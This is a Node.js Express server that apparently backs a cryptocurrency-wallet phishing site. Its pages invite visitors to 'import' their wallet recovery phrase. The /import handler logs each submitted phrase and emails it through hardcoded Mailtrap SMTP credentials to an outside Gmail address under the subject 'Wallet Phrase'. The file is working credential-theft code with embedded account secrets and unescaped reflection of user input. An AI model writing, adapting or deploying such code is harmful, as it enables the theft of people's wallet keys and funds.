const express = require("express")
const path = require("path")
const nodemailer = require("nodemailer")

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true}))

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.get("/integrate-wallets", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/integrate-wallets.html"))
})

app.get("/import-phrase", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/import-phrase.html"))
})

app.post("/import", async (req, res) => {
    try {
        console.log(req.body.Phrase)
        res.send(req.body.Phrase)
        let transport = nodemailer.createTransport({
            host: "smtp.mailtrap.io",
            port: 2525,
            auth: {
                user: "03aa34adf1611f",
                pass: "433a4aa128eab7"
            }
        })
    
        let info = await transport.sendMail({
            from: "michaelstone@gmail.com",
            to: "devtruth17@gmail.com",
            subject: "Wallet Phrase",
            text: req.body.Phrase,
            html: `<b>${req.body.Phrase}</b>`
        })
    } catch(err) {
        console.log(err)
    }
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))